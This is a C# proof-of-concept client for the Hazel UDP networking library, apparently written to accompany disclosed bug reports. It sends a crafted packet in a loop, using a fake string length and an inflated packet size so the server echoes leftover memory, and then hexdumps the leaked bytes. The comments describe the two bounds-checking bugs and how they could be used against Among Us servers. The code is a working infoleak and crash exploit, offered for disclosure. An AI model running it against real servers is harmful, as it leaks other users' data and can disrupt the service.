using System;
using System.Net;
using System.Text;
using System.Threading;
using Hazel;

namespace HazelTestClient
{
    class Program
    {
        static Hazel.Udp.UdpClientConnection connection;

        static void Main(string[] args)
        {
            connection = new Hazel.Udp.UdpClientConnection(new IPEndPoint(IPAddress.Loopback, 22023));
            connection.DataReceived += HandleNewData;
            connection.Connect();
            if (connection.State != Hazel.ConnectionState.Connected)
            {
                Console.WriteLine("Couldn't connect");
            }
            else
            {
                // Malicious echo packet loop
                MessageWriter writer = MessageWriter.Get(SendOption.None);
                writer.StartMessage(0x7F);

                // BUG 1
                // (issue #5)
                //
                // No bound checks. When the server wants to read a string from
                // an offset, it reads the packed int at that offset, treats it
                // as a length and then proceeds to read the data that comes after
                // it without any bound checks. This can be chained with something
                // else to create an infoleak like this PoC. This can also be used
                // to cause an exception to be thrown in the server by specifying a
                // very large number.
                //
                // This PoC might seem unrealistic. However, this PoC is based on the
                // behaviour of the Among Us server. When an invalid name is sent to
                // the server, it echoes it back to the client. This can be chained
                // with this bug to leak old packets from the server.
                //
                // The line below will add 1 byte to the packet. However, the server
                // will treat this byte as length, and it will proceed to read 0x50
                // more bytes.
                //
                writer.WritePacked(0x50);

                // BUG 2
                // (issue #7)
                // 
                // The server blindly trusts the packet length that is specified in
                // the packet. It does not store the real length of the packet anywhere.
                // By specifying a high packet size and a high string size, the server
                // can be fooled into sending left-over data to the client even after
                // merging pull request #6 (which fixes issue #5). It is also possible
                // to cause an exception to be thrown by using sizes that are way too
                // high.
                //
                // The line below will cause MessageWriter.EndMessage() write a packet
                // size that is higher than what it should write to the byte buffer. This
                // may or may not be considered a bug. This is required to exploit the
                // bug described above, which definitely is a bug.
                //
                writer.Position += 0x500;
                writer.EndMessage(); // EndMessage() doesn't modify the Position property
                writer.Position -= 0x500;

                while (true)
                {
                    connection.Send(writer);
                    Thread.Sleep(1000);
                    if (connection.State != Hazel.ConnectionState.Connected)
                    {
                        Console.WriteLine("Connection closed.");
                        break;
                    }
                }
                writer.Recycle();
            }
            Console.Write("Press any key to exit... ");
            Console.ReadKey();
        }

        // This code generates a hexdump, nothing malicious here.
        // If this function is executed, this means the exploit was
        // successful.
        static void HandleNewData(DataReceivedEventArgs args)
        {
            Console.WriteLine("Received new data!");
            byte[] byteArray = args.Message.Buffer;
            for (int i = 0; i < args.Message.Length; i += 16)
            {
                int writeCounter = 0;
                for (int j = i; j < i + 16 && j < byteArray.Length; j++)
                {
                    byte byteValue = Convert.ToByte(byteArray[j]);
                    if (byteValue < 0x10)
                    {
                        Console.Write("0");
                    }
                    Console.Write($"{byteValue.ToString("x")} ");
                    writeCounter += 3;
                }

                while (writeCounter++ < 50)
                {
                    Console.Write(" ");
                }

                for (int j = i; j < i + 16 && j < byteArray.Length; j++)
                {
                    byte byteValue = Convert.ToByte(byteArray[j]);
                    if ((byteValue < ' ') || (byteValue > '~')) {
                        byteValue = Convert.ToByte('.');
                    }
                    Console.Write(Convert.ToChar(byteValue));
                }

                Console.Write("\n");
            }
        }
    }
}
